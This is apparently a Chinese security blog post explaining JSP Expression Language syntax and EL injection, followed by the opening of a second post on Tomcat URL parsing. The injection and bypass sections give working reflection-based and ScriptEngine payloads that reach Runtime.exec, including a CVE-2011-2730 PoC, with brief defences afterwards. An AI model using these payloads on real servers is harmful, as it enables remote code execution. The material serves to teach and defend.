<h3 id="与-运算符"><a href="#与-运算符" class="headerlink" title="[ ]与.运算符"></a>[ ]与.运算符</h3><p>EL表达式提供<code>.</code>和<code>[]</code>两种运算符来存取数据。</p>
<p>当要存取的属性名称中包含一些特殊字符，如<code>.</code>或<code>-</code>等并非字母或数字的符号，就一定要使用<code>[]</code>。例如：<code>${user.My-Name}</code>应当改为<code>${user[&quot;My-Name&quot;]}</code>。</p>
<p>如果要动态取值时，就可以用<code>[]</code>来做，而<code>.</code>无法做到动态取值。例如：<code>${sessionScope.user[data]}</code>中data 是一个变量。</p>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>EL表达式存取变量数据的方法很简单，例如：<code>${username}</code>。它的意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传””。EL表达式的属性如下：</p>
<table>
<thead>
<tr>
<th>属性范围在EL中的名称</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Page</td>
<td>PageScope</td>
</tr>
<tr>
<td>Request</td>
<td>RequestScope</td>
</tr>
<tr>
<td>Session</td>
<td>SessionScope</td>
</tr>
<tr>
<td>Application</td>
<td>ApplicationScope</td>
</tr>
</tbody>
</table>
<p>JSP表达式语言定义可在表达式中使用的以下文字：</p>
<table>
<thead>
<tr>
<th style="text-align:left">文字</th>
<th style="text-align:left">文字的值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Boolean</td>
<td style="text-align:left">true 和 false</td>
</tr>
<tr>
<td style="text-align:left">Integer</td>
<td style="text-align:left">与 Java 类似。可以包含任何整数，例如 24、-45、567</td>
</tr>
<tr>
<td style="text-align:left">Floating Point</td>
<td style="text-align:left">与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567</td>
</tr>
<tr>
<td style="text-align:left">String</td>
<td style="text-align:left">任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。</td>
</tr>
<tr>
<td style="text-align:left">Null</td>
<td style="text-align:left">null</td>
</tr>
</tbody>
</table>
<h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><p>JSP表达式语言提供以下操作符，其中大部分是Java中常用的操作符：</p>
<table>
<thead>
<tr>
<th style="text-align:left">术语</th>
<th style="text-align:left">定义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">算术型</td>
<td style="text-align:left">+、-（二元）、*、/、div、%、mod、-（一元）</td>
</tr>
<tr>
<td style="text-align:left">逻辑型</td>
<td style="text-align:left">and、&amp;&amp;、or、双管道符、!、not</td>
</tr>
<tr>
<td style="text-align:left">关系型</td>
<td style="text-align:left">==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td>
</tr>
<tr>
<td style="text-align:left">空</td>
<td style="text-align:left">empty 空操作符是前缀操作，可用于确定值是否为空。</td>
</tr>
<tr>
<td style="text-align:left">条件型</td>
<td style="text-align:left">A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td>
</tr>
</tbody>
</table>
<h3 id="隐式对象"><a href="#隐式对象" class="headerlink" title="隐式对象"></a>隐式对象</h3><p>JSP表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：</p>
<table>
<thead>
<tr>
<th>术语</th>
<th>定义</th>
</tr>
</thead>
<tbody>
<tr>
<td>pageContext</td>
<td>JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，<code>${pageContext.response}</code>为页面的响应对象赋值。</td>
</tr>
</tbody>
</table>
<p>此外，还提供几个隐式对象，允许对以下对象进行简易访问：</p>
<table>
<thead>
<tr>
<th style="text-align:left">术语</th>
<th style="text-align:left">定义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">param</td>
<td style="text-align:left">将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式<code>${param . name}</code>相当于 request.getParameter (name)。</td>
</tr>
<tr>
<td style="text-align:left">paramValues</td>
<td style="text-align:left">将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 <code>${paramvalues. name}</code> 相当于 request.getParamterValues(name)。</td>
</tr>
<tr>
<td style="text-align:left">header</td>
<td style="text-align:left">将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 <code>${header. name}</code> 相当于 request.getHeader(name)。</td>
</tr>
<tr>
<td style="text-align:left">headerValues</td>
<td style="text-align:left">将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式<code>${headerValues. name}</code>相当于 request.getHeaderValues(name)。</td>
</tr>
<tr>
<td style="text-align:left">cookie</td>
<td style="text-align:left">将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式<code>${cookie. name .value}</code>返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用<code>${headerValues. name}</code>表达式。</td>
</tr>
<tr>
<td style="text-align:left">initParam</td>
<td style="text-align:left">将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。</td>
</tr>
</tbody>
</table>
<p>除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：</p>
<table>
<thead>
<tr>
<th style="text-align:left">术语</th>
<th style="text-align:left">定义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">pageScope</td>
<td style="text-align:left">将页面范围的变量名称映射到其值。例如，EL 表达式可以使用<code>${pageScope.objectName}</code>访问一个 JSP 中页面范围的对象，还可以使用<code>${pageScope .objectName. attributeName}</code>访问对象的属性。</td>
</tr>
<tr>
<td style="text-align:left">requestScope</td>
<td style="text-align:left">将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用<code>${requestScope. objectName}</code>访问一个 JSP 请求范围的对象，还可以使用<code>${requestScope. objectName. attributeName}</code>访问对象的属性。</td>
</tr>
<tr>
<td style="text-align:left">sessionScope</td>
<td style="text-align:left">将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：<code>${sessionScope. name}</code></td>
</tr>
<tr>
<td style="text-align:left">applicationScope</td>
<td style="text-align:left">将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。</td>
</tr>
</tbody>
</table>
<h4 id="pageContext对象"><a href="#pageContext对象" class="headerlink" title="pageContext对象"></a>pageContext对象</h4><p>pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/04/26/浅析EL表达式注入漏洞/1.png" alt=""></p>
<h4 id="Scope对象"><a href="#Scope对象" class="headerlink" title="Scope对象"></a>Scope对象</h4><p>pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。</p>
<p>举例来说，如果您需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box。</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">    pageContext.setAttribute(<span class="string">"name"</span>,<span class="string">"mi1k7ea_page"</span>);  </span><br><span class="line">    request.setAttribute(<span class="string">"name"</span>,<span class="string">"mi1k7ea_request"</span>);</span><br><span class="line">    session.setAttribute(<span class="string">"user"</span>,<span class="string">"mi1k7ea_session"</span>);</span><br><span class="line">    application.setAttribute(<span class="string">"user"</span>,<span class="string">"mi1k7ea_application"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">pageScope.name:$&#123;pageScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">requestScope.name : $&#123;requestScope.name&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">sessionScope.user : $&#123;sessionScope.user&#125;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">applicationScope.user : $&#123;applicationScope.user&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/04/26/浅析EL表达式注入漏洞/5.png" alt=""></p>
<h4 id="param和paramValues对象"><a href="#param和paramValues对象" class="headerlink" title="param和paramValues对象"></a>param和paramValues对象</h4><p>param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。</p>
<p>举例来说，访问一个名为order的参数，可以这样使用表达式：${param.order}，或者${param[“order”]}。</p>
<p>接下来的例子表明了如何访问request中的username参数：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.util.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String title = <span class="string">"Accessing Request Param"</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;param["username"]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。</p>
<p><img src="/2020/04/26/浅析EL表达式注入漏洞/2.png" alt=""></p>
<h4 id="header和headerValues对象"><a href="#header和headerValues对象" class="headerlink" title="header和headerValues对象"></a>header和headerValues对象</h4><p>header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。</p>
<p>举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：<code>${header.user-agent}</code>，或者<code>${header[&quot;user-agent&quot;]}</code>。</p>
<p>接下来的例子表明了如何访问user-agent信息头：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.util.*"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String title = <span class="string">"User Agent Example"</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">"center"</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;header["user-agent"]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>运行结果如下：</p>
<p><img src="/2020/04/26/浅析EL表达式注入漏洞/3.png" alt=""></p>
<p>header对象返回单一值，而headerValues则返回一个字符串数组。</p>
<h3 id="EL中的函数"><a href="#EL中的函数" class="headerlink" title="EL中的函数"></a>EL中的函数</h3><p>EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;ns:func(param1, param2, ...)&#125;</span><br></pre></td></tr></table></figure>
<p>ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推。比如，有函数fn:length，在JSTL库中定义，可以像下面这样来获取一个字符串的长度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;fn:length(&quot;Get my length&quot;)&#125;</span><br></pre></td></tr></table></figure>
<p>要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用<code>&lt;taglib&gt;</code>标签在JSP文件中包含这些库。</p>
<h3 id="EL表达式调用Java方法"><a href="#EL表达式调用Java方法" class="headerlink" title="EL表达式调用Java方法"></a>EL表达式调用Java方法</h3><p>看个例子即可。</p>
<p>先新建一个ELFunc类，其中定义的doSomething()函数用于给输入的参数字符拼接”.com”形成域名返回：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> eltest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ELFunc</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doSomething</span><span class="params">(String str)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> str + <span class="string">".com"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着在WEB-INF文件夹下（除lib和classess目录外）新建test.tld文件，其中指定执行的Java方法及其URI地址：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">taglib</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>ELFunc<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uri</span>&gt;</span>http://www.mi1k7ea.com/ELFunc<span class="tag">&lt;/<span class="name">uri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>doSomething<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-class</span>&gt;</span>eltest.ELFunc<span class="tag">&lt;/<span class="name">function-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-signature</span>&gt;</span> java.lang.String doSomething(java.lang.String)<span class="tag">&lt;/<span class="name">function-signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用<code>类名:方法名()</code>的形式来调用该类方法即可：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@taglib</span> uri=<span class="string">"http://www.mi1k7ea.com/ELFunc"</span> prefix=<span class="string">"ELFunc"</span>%&gt;</span><br><span class="line">$&#123;ELFunc:doSomething(<span class="string">"mi1k7ea"</span>)&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/04/26/浅析EL表达式注入漏洞/6.png" alt=""></p>
<h2 id="0x03-JSP中启动-禁用EL表达式"><a href="#0x03-JSP中启动-禁用EL表达式" class="headerlink" title="0x03 JSP中启动/禁用EL表达式"></a>0x03 JSP中启动/禁用EL表达式</h2><h3 id="全局禁用EL表达式"><a href="#全局禁用EL表达式" class="headerlink" title="全局禁用EL表达式"></a>全局禁用EL表达式</h3><p>web.xml中进入如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-ignored</span>&gt;</span>true<span class="tag">&lt;/<span class="name">el-ignored</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="单个文件禁用EL表达式"><a href="#单个文件禁用EL表达式" class="headerlink" title="单个文件禁用EL表达式"></a>单个文件禁用EL表达式</h3><p>在JSP文件中可以有如下定义：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">"true"</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。</p>
<p>JSP2.0中默认的启用EL表达式。</p>
<p>例如如下的JSP代码禁用EL表达式：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">"true"</span> %&gt;</span><br><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/04/26/浅析EL表达式注入漏洞/4.png" alt=""></p>
<h2 id="0x04-EL表达式注入漏洞"><a href="#0x04-EL表达式注入漏洞" class="headerlink" title="0x04 EL表达式注入漏洞"></a>0x04 EL表达式注入漏洞</h2><p>EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p>
<p>一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。</p>
<h3 id="通用PoC"><a href="#通用PoC" class="headerlink" title="通用PoC"></a>通用PoC</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line">//获取Web路径</span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;</span><br><span class="line"></span><br><span class="line">//文件头参数</span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line">//获取webRoot</span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line">//执行命令</span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
<p>比如我们在Java程序中可以控制输入EL表达式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125;</span><br></pre></td></tr></table></figure>
<p>如果该EL表达式直接在JSP页面中执行，则触发任意代码执行漏洞：</p>
<p><img src="/2020/04/26/浅析EL表达式注入漏洞/11.png" alt=""></p>
<p>但是在实际场景中，是几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的。</p>
<h3 id="CVE-2011-2730"><a href="#CVE-2011-2730" class="headerlink" title="CVE-2011-2730"></a>CVE-2011-2730</h3><p>命令执行PoC如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;spring:message text=</span><br><span class="line"><span class="string">"$&#123;/"</span>/<span class="string">".getClass().forName(/"</span>java.lang.Runtime/<span class="string">").getMethod(/"</span>getRuntime/<span class="string">",null).invoke(null,null).exec(/"</span>calc/<span class="string">",null).toString()&#125;"</span>&gt;</span><br><span class="line">&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure>
<p>再比如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">"http://www.springframework.org/tags"</span> prefix=<span class="string">"spring"</span>%&gt;</span><br><span class="line">&lt;spring:message  text="$&#123;param.a&#125;"&gt;&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure>
<p>访问<code>http://localhost/XXX.jsp?a=$](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%2FXXX.jsp%3Fa%3D%24){applicationScope}</code>。</p>
<p>容器第一次执行EL表达式<code>${param.a}</code>获得了我们输入的<code>${applicationScope}</code>，然后Spring标签获取容器的EL表达式求值对象，把<code>${applicationScope}</code>再次执行掉，形成了漏洞。</p>
<h3 id="Wooyun案例"><a href="#Wooyun案例" class="headerlink" title="Wooyun案例"></a>Wooyun案例</h3><p>参考Wooyun镜像上的案例：</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0195845.html" target="_blank" rel="noopener">搜狗某系统存在远程EL表达式注入漏洞(命令执行)</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0196160.html" target="_blank" rel="noopener">工商银行某系统存在远程EL表达式注入漏洞(命令执行)</a></p>
<h3 id="JUEL示例"><a href="#JUEL示例" class="headerlink" title="JUEL示例"></a>JUEL示例</h3><p>下面我们直接看下在Java代码中EL表达式注入的场景是怎么样的。</p>
<p>EL曾经是JSTL的一部分。然后，EL进入了JSP 2.0标准。现在，尽管是JSP 2.1的一部分，但EL API已被分离到包javax.el中， 并且已删除了对核心JSP类的所有依赖关系。换句话说：EL已准备好在非JSP应用程序中使用！</p>
<p>也就是说，现在EL表达式所依赖的包javax.el等都在JUEL相关的jar包中。</p>
<p>JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</p>
<p>更多参考官网：<a href="http://juel.sourceforge.net/" target="_blank" rel="noopener">http://juel.sourceforge.net/</a></p>
<p>需要的jar包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。</p>
<p>Test.java，利用反射调用Runtime类方法实现命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.util.SimpleContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.el.ExpressionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.el.ValueExpression;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExpressionFactory expressionFactory = <span class="keyword">new</span> ExpressionFactoryImpl();</span><br><span class="line">        SimpleContext simpleContext = <span class="keyword">new</span> SimpleContext();</span><br><span class="line">        <span class="comment">// failed</span></span><br><span class="line">        <span class="comment">// String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;";</span></span><br><span class="line">        <span class="comment">// ok</span></span><br><span class="line">        String exp = <span class="string">"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;"</span>;</span><br><span class="line">        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);</span><br><span class="line">        System.out.println(valueExpression.getValue(simpleContext));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行即触发：</p>
<p><img src="/2020/04/26/浅析EL表达式注入漏洞/7.png" alt=""></p>
<h2 id="0x05-绕过方法"><a href="#0x05-绕过方法" class="headerlink" title="0x05 绕过方法"></a>0x05 绕过方法</h2><p>这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。</p>
<h3 id="利用反射机制绕过"><a href="#利用反射机制绕过" class="headerlink" title="利用反射机制绕过"></a>利用反射机制绕过</h3><p>即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。</p>
<h3 id="利用ScriptEngine调用JS引擎绕过"><a href="#利用ScriptEngine调用JS引擎绕过" class="headerlink" title="利用ScriptEngine调用JS引擎绕过"></a>利用ScriptEngine调用JS引擎绕过</h3><p>同SpEL注入中讲到的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;&apos;&apos;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)&quot;)&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/04/26/浅析EL表达式注入漏洞/8.png" alt=""></p>
<h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul>
<li><p>尽量不使用外部输入的内容作为EL表达式内容；</p>
</li>
<li><p>若使用，则严格过滤EL表达式注入漏洞的payload关键字；</p>
</li>
<li><p>如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://www.runoob.com/jsp/jsp-expression-language.html" target="_blank" rel="noopener">JSP 表达式语言</a></p>
<p><a href="https://www.cnblogs.com/taoshihan/p/5638449.html" target="_blank" rel="noopener">EL表达式调用java方法</a></p>
<p><a href="https://www.cnblogs.com/junsec/p/11132652.html" target="_blank" rel="noopener">JAVA WEB EL表达式注入</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>EL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>（先知首发）Tomcat URL解析差异性导致的安全问题</title>
    <url>/2020/04/01/Tomcat-URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>先知：<a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a></p>
<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。</p>
<p>当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。</p>
<h2 id="0x02-URL解析差异性"><a href="#0x02-URL解析差异性" class="headerlink" title="0x02 URL解析差异性"></a>0x02 URL解析差异性</h2><h3 id="HttpServletRequest中几个解析URL的函数"><a href="#HttpServletRequest中几个解析URL的函数" class="headerlink" title="HttpServletRequest中几个解析URL的函数"></a>HttpServletRequest中几个解析URL的函数</h3><p>在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数：</p>
<ul>
<li>request.getRequestURL()：返回全路径；</li>
<li>request.getRequestURI()：返回除去Host（域名或IP）部分的路径；</li>
<li>request.getContextPath()：返回工程名部分，如果工程映射为<code>/</code>，则返回为空；</li>
<li>request.getServletPath()：返回除去Host和工程名部分的路径；</li>
<li>request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</li>
</ul>
<p>网上的一个小结，Servlet的匹配路径为<code>/test%3F/*</code>，并且Web应用是部署在<code>/app</code>下，此时请求的URL为<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>，各个函数解析如下表：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>URL解码</th>
<th>解析结构</th>
</tr>
</thead>
<tbody>
<tr>
<td>getRequestURL()</td>
<td>no</td>
<td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td>
</tr>
<tr>
<td>getRequestURI()</td>
<td>no</td>
<td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td>
</tr>
<tr>
<td>getContextPath()</td>
<td>no</td>
<td><code>/app</code></td>
</tr>
<tr>
<td>getServletPath()</td>
<td>yes</td>
<td><code>/test?</code></td>
</tr>
<tr>
<td>getPathInfo()</td>
<td>yes</td>
<td><code>/a?+b</code></td>
</tr>
</tbody>
</table>
